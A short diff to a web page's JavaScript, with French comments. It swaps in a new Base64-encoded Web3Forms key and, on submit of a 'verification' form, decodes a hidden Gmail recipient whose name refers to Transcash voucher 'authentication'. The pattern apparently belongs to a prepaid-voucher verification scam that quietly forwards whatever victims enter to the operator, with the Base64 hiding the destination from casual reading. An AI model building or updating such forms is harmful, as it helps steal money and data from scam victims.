@@ -183,14 +183,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
   const form = document.getElementById('verification-form');
-if (form) {
-  // Vos clés encodées en Base64
-  const k = "ZmY2MWVlNjUtZTUwNi00M2EwLTg2YWYtNWM5MTBiYTkwZDkx"; 
+  if (form) {
+  // Vos clés encodées en Base64 (Nouvelle clé 'k' mise à jour)
+  const k = "NjNiYzE4ODktZjkwOC00YjY0LWEzNjQtYmM0NDkyNWEyYjhh"; 
   const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
 
-    form.addEventListener('submit', function (e) {
-      document.getElementById('wf_key').value = atob(k);
-      document.getElementById('wf_email').value = atob(m);
-    });
+  form.addEventListener('submit', function (e) {
+    document.getElementById('wf_key').value = atob(k);
+    document.getElementById('wf_email').value = atob(m);
+  });
+}
   }
 });
